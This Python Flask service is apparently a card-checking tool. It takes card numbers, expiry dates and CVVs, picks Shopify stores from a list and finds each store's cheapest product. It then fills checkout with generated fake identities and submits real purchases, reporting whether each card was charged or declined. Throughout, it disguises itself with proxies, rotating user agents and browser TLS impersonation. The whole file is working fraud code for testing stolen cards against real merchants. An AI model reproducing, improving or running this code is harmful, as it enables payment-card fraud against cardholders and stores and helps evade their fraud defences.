import os
import random
import re
import html
import string
import uuid
import time
import json
import urllib3
from urllib.parse import quote, unquote, urlparse, parse_qs
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ==========================================
# ⚡ TLS & USER-AGENT CONFIG (From reference)
# ==========================================
BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ==========================================
# 🎭 US ADDRESSES ONLY
# ==========================================
FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

ADDRESSES = [
    {"street": "100 SW Main St", "city": "Portland", "state": "OR", "zip": "97204", "phone": "+15035550100"},
    {"street": "223 Pioneer Blvd", "city": "Salem", "state": "OR", "zip": "97301", "phone": "+15035550101"},
    {"street": "101 N Last Chance Gulch", "city": "Helena", "state": "MT", "zip": "59601", "phone": "+14065550100"},
    {"street": "1 Granite St", "city": "Concord", "state": "NH", "zip": "03301", "phone": "+16035550100"},
    {"street": "100 W 10th St", "city": "Wilmington", "state": "DE", "zip": "19801", "phone": "+13025550100"},
]

def generate_identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    addr = random.choice(ADDRESSES)
    return fn, ln, email, addr["street"], addr["city"], addr["state"], addr["zip"], addr["phone"]

def random_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ==========================================
# 🔍 EXTRACTION HELPERS
# ==========================================
def extract_session_token(raw_html):
    patterns = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, raw_html)
        if m:
            t = m.group(1).strip()
            if t.startswith("&quot;"): t = t[6:]
            if t.endswith("&quot;"): t = t[:-6]
            t = t.strip('"\'')
            if len(t) > 50: return t
    return ""

def extract_commit_sha(checkout_html):
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return m.group(1) if m else ""

def extract_stable_id(checkout_html):
    unescaped = html.unescape(checkout_html)
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', unescaped)
    return m.group(1) if m else ""

def extract_queue_token(proposal_json):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""

def extract_signed_handles(proposal_json):
    try:
        data = json.loads(proposal_json)
        seller = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
        de = seller.get("deliveryExpectations", {})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
    except Exception: pass
    return []

def extract_delivery_handle(proposal_body):
    try:
        data = json.loads(proposal_body)
        seller = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
        sds = seller.get("selectedDeliveryStrategy", {})
        if sds.get("handle"): return sds["handle"]
        for dg in seller.get("deliveryGroups", []):
            for opt in dg.get("deliveryOptions", []):
                if opt.get("handle"): return opt["handle"]
    except Exception: pass
    return ""

def extract_payment_method_id(proposal_body):
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"', proposal_body)
    return m.group(1) if m else ""

def extract_checkout_total(proposal_body):
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""

def extract_tax_amount(proposal_json):
    try:
        data = json.loads(proposal_json)
        seller = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {})
        return seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception: return "0.0"

# ==========================================
# 🔑 DYNAMIC GRAPHQL ID FETCHER
# ==========================================
def fetch_graphql_ids(session, shop_url, checkout_html, ua):
    actions_url = ""
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    if match: actions_url = shop_url + match.group(1)
    if not actions_url: return None, None, None

    try:
        r = session.get(actions_url, headers={"user-agent": ua}, timeout=10)
        js = r.text
        prop_id = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        submit_id = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        poll_id = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        
        return (prop_id.group(1) if prop_id else None, 
                submit_id.group(1) if submit_id else None, 
                poll_id.group(1) if poll_id else None)
    except Exception:
        return None, None, None

# ==========================================
# 🛍️ GET CHEAPEST PRODUCT
# ==========================================
def find_cheapest_product(session, shop_url, ua):
    try:
        r = session.get(f"{shop_url}/products.json?limit=250", headers={"user-agent": ua}, timeout=10)
        if r.status_code != 200: return None, None
        data = r.json()
        
        best_price = float('inf')
        best_variant = None
        
        for p in data.get("products", []):
            for v in p.get("variants", []):
                if not v.get("available"): continue
                try: price = float(v.get("price", "0"))
                except: continue
                if price >= 0.50 and price < best_price:
                    best_price = price
                    best_variant = str(v.get("id"))
                    
        return best_variant, str(best_price)
    except Exception: pass
    return None, None

# ==========================================
# 🛒 GRAPHQL PAYLOAD BUILDER
# ==========================================
def build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, proposal_id):
    # Simplified builder that inserts email/address if provided
    email_block = f'"email": "{email}", "emailChanged": true,' if email else ''
    addr_block = json.dumps({"streetAddress": {"address1": addr.get("street",""), "city": addr.get("city",""), "countryCode": "US", "postalCode": addr.get("zip",""), "firstName": addr.get("fn",""), "lastName": addr.get("ln",""), "zoneCode": addr.get("state",""), "phone": addr.get("phone","")}}) if addr else 'null'
    
    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token}, "queueToken": None,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{"destination": {"partialStreetAddress": {"address1": addr.get("street",""), "city": addr.get("city",""), "countryCode": "US", "lastName": addr.get("ln",""), "phone": "", "oneTimeUse": False}} if addr else {"partialStreetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": False}},
                    "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                    "targetMerchandiseLines": {"any": True}, "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": True}],
                "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"value": {"amount": amount, "currencyCode": currency}}}]},
            "memberships": {"memberships": []},
            "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": addr.get("street",""), "city": addr.get("city",""), "countryCode": "US", "postalCode": addr.get("zip",""), "firstName": addr.get("fn",""), "lastName": addr.get("ln",""), "zoneCode": addr.get("state",""), "phone": addr.get("phone","")}} if addr else None},
            "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": email or None, "emailChanged": bool(email), "phoneCountryCode": "US", "marketingConsent": [], "rememberMe": False},
            "taxes": {"proposedTotalAmount": {"any": True}}
        },
        "operationName": "Proposal",
        "id": proposal_id
    }

# ==========================================
# 🚀 MAIN PROCESS
# ==========================================
@app.route("/")
def check_card():
    card_str = request.args.get("card")
    proxy_str = request.args.get("proxy", "")
    if not card_str: return jsonify({"Response": "MISSING_CARD", "success": False})
    
    parts = card_str.split("|")
    if len(parts) < 4: return jsonify({"Response": "INVALID_CARD", "success": False})
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    # Load site.txt
    shop_url = "https://thats-what-che-said.myshopify.com"
    try:
        with open("site.txt", "r") as f:
            sites = [line.strip() for line in f if line.strip()]
            if sites: shop_url = random.choice(sites)
    except: pass

    proxy_url = ""
    if proxy_str:
        for scheme in ["socks5://", "socks5h://", "http://", "https://"]:
            if proxy_str.startswith(scheme): proxy_str = proxy_str[len(scheme):]
        p = proxy_str.split(":")
        if len(p) == 2: proxy_url = f"socks5h://{p[0]}:{p[1]}"
        elif len(p) >= 4: proxy_url = f"socks5h://{p[2]}:{p[3]}@{p[0]}:{p[1]}"

    ua = random.choice(USER_AGENTS)
    imp = random.choice(BROWSER_PROFILES)
    session = requests.Session(impersonate=imp)
    if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # 1. Cheapest Product
        variant_id, price = find_cheapest_product(session, shop_url, ua)
        if not variant_id: return jsonify({"Response": "NO_PRODUCTS", "success": False})

        # 2. Cart Permalink -> Checkout
        r = session.get(f"{shop_url}/cart/{variant_id}:1", headers={"user-agent": ua}, allow_redirects=True, timeout=15)
        if r.status_code not in (200, 302): return jsonify({"Response": "CART_FAILED", "success": False})

        checkout_url = r.url
        checkout_html = r.text
        cart_token = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
        cart_token = cart_token.group(1) if cart_token else ""

        session_token = extract_session_token(checkout_html)
        commit_sha = extract_commit_sha(checkout_html)
        stable_id = extract_stable_id(checkout_html)
        if not (session_token and commit_sha and stable_id): return jsonify({"Response": "MISSING_TOKENS", "success": False})

        # 3. Fetch Dynamic GraphQL IDs
        prop_id, submit_id, poll_id = fetch_graphql_ids(session, shop_url, checkout_html, ua)
        if not prop_id: prop_id = "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8" # fallback
        if not submit_id: submit_id = "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        if not poll_id: poll_id = "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567"

        currency = "USD"
        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
        if m: currency = m.group(1)
        
        amount = price
        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
        if m: amount = m.group(1)

        # 4. Proposal Handshake (3 Steps)
        fn, ln, email, street, city, state, zipc, phone = generate_identity()
        addr = {"street": street, "city": city, "state": state, "zip": zipc, "fn": fn, "ln": ln, "phone": phone}
        
        prop_headers = {
            "accept": "application/json", "content-type": "application/json", "origin": shop_url, "referer": checkout_url,
            "shopify-checkout-client": "checkout-web/1.0", "shopify-checkout-source": f'id="{cart_token}", type="cn"',
            "user-agent": ua, "x-checkout-one-session-token": session_token, "x-checkout-web-build-id": commit_sha
        }

        # Proposal 1
        payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, None, None, prop_id)
        r1 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=prop_headers, json=payload, timeout=15)
        queue_token = extract_queue_token(r1.text)
        
        # Proposal 2
        payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, None, prop_id)
        payload["variables"]["queueToken"] = queue_token
        r2 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=prop_headers, json=payload, timeout=15)

        # Proposal 3
        payload = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, prop_id)
        payload["variables"]["queueToken"] = queue_token
        r3 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal", headers=prop_headers, json=payload, timeout=15)

        # Extract data from Proposal 3
        payment_method_id = extract_payment_method_id(r3.text)
        delivery_handle = extract_delivery_handle(r3.text)
        signed_handles = extract_signed_handles(r3.text)
        tax_amount = extract_tax_amount(r3.text)
        
        real_total = extract_checkout_total(r3.text)
        if real_total: amount = real_total

        if not payment_method_id: return jsonify({"Response": "NO_PAYMENT_METHOD", "success": False})

        # 5. Tokenize Card (PCI)
        pci_payload = {"credit_card": {"number": ccn, "month": int(mm), "year": int(yyyy), "verification_value": cvv, "name": f"{fn} {ln}"}, "payment_session_scope": shop_url.split("//")[1]}
        r_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json=pci_payload, headers={"origin": "https://checkout.pci.shopifyinc.com", "user-agent": ua}, timeout=15)
        session_id = r_pci.json().get("id")
        if not session_id: return jsonify({"Response": "PCI_FAILED", "success": False})

        # 6. Submit
        submit_payload = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr}, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]}, "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
                    "deliveryExpectations": {"deliveryExpectationLines": [{"signedHandle": h} for h in signed_handles]},
                    "merchandise": {"merchandiseLines": [{"stableId": stable_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"value": {"amount": amount, "currencyCode": currency}},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"sessionId": session_id, "paymentMethodIdentifier": payment_method_id, "billingAddress": {"streetAddress": addr}, "cardSource": None}}, "amount": {"value": {"amount": amount, "currencyCode": currency}}}],
                        "billingAddress": {"streetAddress": addr}
                    },
                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": email, "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "rememberMe": False},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": tax_amount, "currencyCode": currency}}}
                },
                "attemptToken": f"{cart_token}-{random_suffix()}", "metafields": [], "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())}
            },
            "operationName": "SubmitForCompletion", "id": submit_id
        }
        
        r_submit = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", json=submit_payload, headers=prop_headers, timeout=15)
        
        if '"FailedReceipt"' in r_submit.text:
            code_m = re.search(r'"code"\s*:\s*"([^"]+)"', r_submit.text)
            code = code_m.group(1) if code_m else "DECLINED"
            return jsonify({"Response": code, "Price": f"{amount} {currency}", "Gate": "Shopify Payments", "success": False})
            
        if '"ProcessedReceipt"' in r_submit.text:
            return jsonify({"Response": "ORDER_PLACED", "Charged": "True", "Price": f"{amount} {currency}", "Gate": "Shopify Payments", "success": True})
            
        return jsonify({"Response": "UNKNOWN", "success": False})

    except Exception as e:
        return jsonify({"Response": f"ERROR_{str(e)[:20]}", "success": False})

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), threaded=True)
